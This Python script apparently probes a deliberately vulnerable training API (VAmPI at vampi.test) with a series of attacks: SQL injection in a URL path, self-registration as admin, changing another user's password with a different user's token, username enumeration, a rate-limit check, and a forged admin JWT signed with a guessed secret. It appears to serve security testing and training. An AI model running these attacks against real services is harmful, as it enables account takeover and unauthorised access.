from __future__ import annotations

import json
import secrets
import time
import hmac
import hashlib
import base64

import httpx


BASE = "http://vampi.test"


def j(resp: httpx.Response) -> dict:
    try:
        payload = resp.json()
    except Exception:
        return {}
    return payload if isinstance(payload, dict) else {}


def login(client: httpx.Client, username: str, password: str) -> str:
    response = client.post(
        BASE + "/users/v1/login",
        json={"username": username, "password": password},
    )
    print("login", username, response.status_code, response.text[:300])
    return str(j(response).get("auth_token") or "")


with httpx.Client(timeout=20, follow_redirects=False) as client:
    response = client.get(
        BASE + "/users/v1/nonexistent%27%20OR%20%271%27%3D%271"
    )
    print("sqli", response.status_code, response.text[:300])

    response = client.get(BASE + "/users/v1/_debug")
    print("debug", response.status_code, response.text[:300])

    suffix = secrets.token_hex(4)
    admin_username = f"probe_admin_{suffix}"
    admin_password = f"AdminPass-{suffix}"
    response = client.post(
        BASE + "/users/v1/register",
        json={
            "username": admin_username,
            "password": admin_password,
            "email": f"{admin_username}@example.test",
            "admin": True,
        },
    )
    print("register-admin", response.status_code, response.text[:300])
    admin_token = login(client, admin_username, admin_password)
    response = client.get(
        BASE + "/me",
        headers={"Authorization": f"Bearer {admin_token}"},
    )
    print("me-admin", response.status_code, response.text[:300])

    name1_token = login(client, "name1", "pass1")
    response = client.get(BASE + "/books/v1")
    print("books", response.status_code, response.text[:500])

    victim_username = f"probe_victim_{suffix}"
    victim_old = f"VictimOld-{suffix}"
    victim_new = f"VictimNew-{suffix}"
    client.post(
        BASE + "/users/v1/register",
        json={
            "username": victim_username,
            "password": victim_old,
            "email": f"{victim_username}@example.test",
        },
    )
    response = client.put(
        BASE + f"/users/v1/{victim_username}/password",
        headers={"Authorization": f"Bearer {name1_token}"},
        json={"password": victim_new},
    )
    print("password-change", response.status_code, response.text[:300])
    login(client, victim_username, victim_new)

    existing = client.post(
        BASE + "/users/v1/login",
        json={"username": "name1", "password": "wrong-password"},
    )
    missing = client.post(
        BASE + "/users/v1/login",
        json={"username": f"missing_{suffix}", "password": "wrong-password"},
    )
    print("enum-existing", existing.status_code, existing.text[:300])
    print("enum-missing", missing.status_code, missing.text[:300])

    statuses = []
    for _ in range(6):
        statuses.append(
            client.post(
                BASE + "/users/v1/login",
                json={"username": "name1", "password": "rate-limit-probe"},
            ).status_code
        )
    print("rate-statuses", statuses)

    def b64url(value: bytes) -> str:
        return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")

    header = b64url(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64url(
        json.dumps(
            {
                "sub": "admin",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
            },
            separators=(",", ":"),
        ).encode()
    )
    unsigned = f"{header}.{payload}"
    signature = b64url(
        hmac.new(b"random", unsigned.encode("ascii"), hashlib.sha256).digest()
    )
    response = client.get(
        BASE + "/me",
        headers={"Authorization": f"Bearer {unsigned}.{signature}"},
    )
    print("jwt", response.status_code, response.text[:300])
